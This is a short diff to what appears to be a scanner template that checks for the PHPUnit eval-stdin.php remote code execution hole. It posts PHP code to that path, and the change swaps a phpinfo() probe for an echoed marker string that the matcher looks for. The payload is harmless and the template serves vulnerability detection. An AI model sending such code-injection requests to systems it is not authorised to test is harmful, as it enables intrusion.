@@ -4,8 +4,9 @@ request:
     POST {{BaseURL}}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
     Content-Type: application/x-www-form-urlencoded
 
-    <?php phpinfo();?>
+    <?php echo "PWNED_9527";?>
+
 
 matcher:
   type: word
-  words: ["PHP Version"]
+  words: ["PWNED_9527"]
